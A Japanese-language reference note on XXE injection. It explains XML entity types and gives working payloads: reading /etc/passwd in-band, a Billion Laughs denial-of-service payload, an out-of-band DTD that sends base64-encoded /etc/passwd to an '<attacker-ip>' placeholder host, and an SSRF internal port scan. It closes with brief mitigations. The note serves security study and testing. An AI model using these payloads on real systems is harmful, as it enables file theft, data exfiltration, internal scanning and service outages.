# XXEインジェクション

## エンティティの種類
### 内部エンティティ
```xml
<!DOCTYPE note [
<!ENTITY inf "This is a test.">
]>
<note>
        <info>&inf;</info>
</note>
```
### 外部エンティティ
```xml
<!DOCTYPE note [
<!ENTITY ext SYSTEM "http://example.com/external.dtd">
]>
<note>
        <info>&ext;</info>
</note>
```
### パラメータエンティティ
```xml
<!DOCTYPE note [
<!ENTITY % common "CDATA">
<!ELEMENT name (%common;)>
]>
<note>
        <name>John Doe</name>
</note>
```
### 一般エンティティ
```xml
<!DOCTYPE note [
<!ENTITY author "John Doe">
]>
<note>
        <writer>&author;</writer>
</note>
```
### 文字エンティティ
```xml
<note>
        <text>Use &lt; to represent a less-than symbol.</text>
</note>
```

## In-Band XXE

このようにnameを参照して画面表示しているとする

```php
$expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
```

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

### Billion Laughs 攻撃

再帰的に展開してリソースを食い尽くし、システムをクラッシュさせることが目的。

```xml
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

## Out-Of-Band XXE

このように参照しているが、応答には含まれないとする
```php
$links = $doc->getElementsByTagName('file');
```

sample.dtd を保存し、HTTPで公開する
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://<attacker-ip>:port/?data=%cmd;'>">
%oobxxe;
```

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://<attacker-ip>:port/" >]>
<upload><file>&xxe;</file></upload>
```

## SSRF + XXE

### 内部ネットワークスキャン

Intruder 等でポート部分を変更して送信する

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

## 緩和

- 外部エンティティと DTD を無効にする
- JSONなどの単純なデータ形式を利用する
- <、>、&、'、" などの XML 固有の文字を除外またはエスケープする

